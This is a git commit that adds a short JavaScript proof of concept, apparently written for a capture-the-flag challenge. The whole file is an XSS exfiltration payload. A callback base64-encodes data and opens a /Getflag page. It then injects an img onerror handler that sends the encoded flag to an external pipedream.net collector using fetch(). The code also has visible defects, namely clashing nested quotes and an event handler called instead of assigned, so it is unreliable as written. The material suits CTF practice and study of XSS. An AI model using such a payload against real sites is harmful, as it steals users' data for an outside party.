05e6f135d8d2444860d213b9581fd78f75b51074
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-26 22:03:21 +0530

    Create new_poc.js

---
+++ new_poc.js
@@ -0,0 +1,7 @@
+var callback = function(data){
+    var __flag = btoa(data)
+    var flag = window.open("/Getflag")
+    flag.window.onload(()=>{
+        flag.document.write(`<img src=x onerror='fetch('https://eoctl0knzoys9l9.m.pipedream.net/?flag=${__flag}')'`)
+    })
+}
